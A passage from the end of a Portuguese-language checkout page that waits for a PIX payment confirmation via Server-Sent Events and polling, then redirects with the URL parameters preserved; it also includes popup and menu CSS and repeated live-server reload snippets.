        startPollingDetection();
        
        // Timeout geral de 30 minutos
        setTimeout(() => {
            if (paymentDetectionActive) {
                console.log('â° Timeout de 30 minutos atingido - parando detecÃ§Ã£o');
                stopPaymentDetection();
            }
        }, 30 * 60 * 1000);
    }

    // DetecÃ§Ã£o via Server-Sent Events
    function startSSEDetection() {
        try {
            const sessionId = generateSessionId();
            console.log('ð Conectando SSE:', sessionId);
            
            sseConnection = new EventSource(`/api/payment-status/${sessionId}`);
            
            sseConnection.onopen = function() {
                console.log('â ConexÃ£o SSE estabelecida com sucesso');
            };
            
            sseConnection.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    
                    if (data.type === 'payment_confirmed') {
                        console.log('ð Pagamento confirmado via SSE!', data);
                        handlePaymentConfirmed(data);
                    } else if (data.type === 'connected') {
                        console.log('ð SSE conectado:', data.sessionId);
                    } else if (data.type === 'heartbeat') {
                        console.log('ð Heartbeat SSE recebido');
                    }
                } catch (error) {
                    console.error('â Erro ao processar evento SSE:', error);
                }
            };
            
            sseConnection.onerror = function(error) {
                console.error('â Erro na conexÃ£o SSE:', error);
                
                // Tentar reconectar apÃ³s 10 segundos se ainda estiver ativo
                if (paymentDetectionActive) {
                    setTimeout(() => {
                        if (paymentDetectionActive && (!sseConnection || sseConnection.readyState === EventSource.CLOSED)) {
                            console.log('ð Tentando reconectar SSE...');
                            startSSEDetection();
                        }
                    }, 10000);
                }
            };
            
        } catch (error) {
            console.error('â Erro ao iniciar SSE:', error);
        }
    }

    // DetecÃ§Ã£o via Polling (fallback)
    function startPollingDetection() {
        if (!currentTransactionId) return;
        
        console.log('ð Iniciando polling de fallback para:', currentTransactionId);
        
        pollingInterval = setInterval(async () => {
            if (!paymentDetectionActive) {
                clearInterval(pollingInterval);
                return;
            }
            
            try {
                console.log('ð Verificando status via polling...');
                
                const response = await fetch(`/api/payment-check/${currentTransactionId}`);
                const data = await response.json();
                
                if (data.found && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.status === 'COMPLETED')) {
                    console.log('ð Pagamento confirmado via polling!', data);
                    handlePaymentConfirmed(data);
                }
            } catch (error) {
                console.error('â Erro no polling:', error);
            }
        }, 10000); // Verifica a cada 10 segundos
    }

    // Parar toda detecÃ§Ã£o
    function stopPaymentDetection() {
        console.log('ð Parando detecÃ§Ã£o de pagamento');
        
        paymentDetectionActive = false;
        
        // Fechar SSE
        if (sseConnection) {
            sseConnection.close();
            sseConnection = null;
        }
        
        // Parar polling
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
    }

    // FunÃ§Ã£o para lidar com pagamento confirmado
    function handlePaymentConfirmed(paymentData) {
        if (!paymentDetectionActive) {
            console.log('DetecÃ§Ã£o jÃ¡ foi finalizada, ignorando evento duplicado');
            return;
        }
        
        console.log('ð Processando pagamento confirmado:', paymentData);
        
        // Parar toda detecÃ§Ã£o primeiro
        stopPaymentDetection();
        
        // Atualizar interface
        document.getElementById('paymentWaiting').style.display = 'none';
        document.getElementById('paymentSuccess').style.display = 'flex';
        
        // Salvar dados
        localStorage.setItem('paymentConfirmed', 'true');
        localStorage.setItem('paymentData', JSON.stringify(paymentData));
        localStorage.setItem('redirectTime', new Date().toISOString());
        
        // Redirecionamento com countdown visual
        let countdown = 3;
        const countdownInterval = setInterval(() => {
            if (countdown > 0) {
                document.getElementById('paymentSuccess').innerHTML = `
                    <i class="fas fa-check-circle"></i>
                    <span>Pagamento aprovado! Redirecionando em ${countdown}s...</span>
                `;
                countdown--;
            } else {
                clearInterval(countdownInterval);
                console.log('ð Redirecionando para /ga/');
                
                // Capturar todos os parÃ¢metros da URL atual para passar para /ga/
                const currentParams = window.location.search;
                const redirectUrl = currentParams ? `../ga/index.html${currentParams}` : '../ga/index.html';
                
                console.log('ð URL de redirecionamento:', redirectUrl);
                window.location.href = redirectUrl;
            }
        }, 1000);
    }

    function closePixModal() {
        document.getElementById('pixModal').style.display = 'none';
        
        // Limpar timers e parar detecÃ§Ã£o
        if (pixTimer) clearInterval(pixTimer);
        stopPaymentDetection();
    }

    // Limpeza quando sair da pÃ¡gina
    window.addEventListener('beforeunload', () => {
        // Salvar parÃ¢metros importantes no localStorage como backup
        const params = getUrlParams();
        if (Object.keys(params).length > 0) {
            localStorage.setItem('lastUrlParams', JSON.stringify(params));
        }
        // Parar detecÃ§Ã£o de pagamento ao sair da pÃ¡gina
        stopPaymentDetection();
    });

    // Verificar se hÃ¡ parÃ¢metros no localStorage ao carregar a pÃ¡gina
    document.addEventListener('DOMContentLoaded', function() {
        const currentParams = new URLSearchParams(window.location.search);
        const savedParams = localStorage.getItem('lastUrlParams');
        
        if (!currentParams.toString() && savedParams) {
            try {
                const parsedParams = JSON.parse(savedParams);
                const newUrl = new URL(window.location.href);
                
                Object.keys(parsedParams).forEach(key => {
                    newUrl.searchParams.set(key, parsedParams[key]);
                });
                
                // Atualizar URL sem recarregar a pÃ¡gina
                window.history.replaceState({}, '', newUrl.toString());
                
                console.log('ParÃ¢metros restaurados do localStorage:', parsedParams);
            } catch (error) {
                console.error('Erro ao restaurar parÃ¢metros:', error);
            }
        }
        
        // Log de debug dos parÃ¢metros finais
        console.log('=== DEBUG UP2/PAGAR FINAL PARAMS ===');
        console.log('URL atual:', window.location.href);
        console.log('ParÃ¢metros da URL:', window.location.search);
        console.log('ParÃ¢metros parseados:', getUrlParams());
        console.log('Dados do usuÃ¡rio:', getUserParams());
        console.log('UTM capturados:', getUtmParameters());
    });
</script>    

    <style>
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .popup {
            background-color: white;
            width: 90%;
            max-width: 400px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
        }
        
        .popup-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: #3483fa;
            color: white;
        }
        
        .popup-header h3 {
            margin: 0;
            font-size: 18px;
            font-weight: 600;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            line-height: 1;
        }
        
        .popup-content {
            padding: 20px;
        }
        
        .popup-content p {
            margin-bottom: 15px;
            font-size: 14px;
            line-height: 1.5;
            color: #333;
        }
        
        .button {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #3483fa;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.2s;
        }
        
        .button:hover {
            background-color: #2968c8;
        }
    </style>



    
    <style>
        .bottom-menu {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: space-around;
            padding: 16px 0 12px;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
            z-index: 100;
            padding-bottom: 20px;
        }
        
        .menu-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            color: #777;
            cursor: pointer;
            transition: color 0.2s;
        }
        
        .menu-item i {
            font-size: 20px;
            margin-bottom: 6px;
        }
        
        .menu-item.active {
            color: #3483fa;
        }
        
        .menu-item:hover {
            color: #3483fa;
        }
    </style>
    



<!-- Code injected by live-server -->
<script>
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>
<!-- Code injected by live-server -->
<script>
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>
<!-- Code injected by live-server -->
<script>
	// <![CDATA[  <-- For SVG support
	if ('WebSocket' in window) {
		(function () {
			function refreshCSS() {
				var sheets = [].slice.call(document.getElementsByTagName("link"));
				var head = document.getElementsByTagName("head")[0];
				for (var i = 0; i < sheets.length; ++i) {
					var elem = sheets[i];
					var parent = elem.parentElement || head;
					parent.removeChild(elem);
					var rel = elem.rel;
					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
					}
					parent.appendChild(elem);
				}
			}
			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
			var address = protocol + window.location.host + window.location.pathname + '/ws';
			var socket = new WebSocket(address);
			socket.onmessage = function (msg) {
				if (msg.data == 'reload') window.location.reload();
				else if (msg.data == 'refreshcss') refreshCSS();
			};
			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
				console.log('Live reload enabled.');
				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
			}
		})();
	}
	else {
		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
	}
	// ]]>
</script>
</body></html>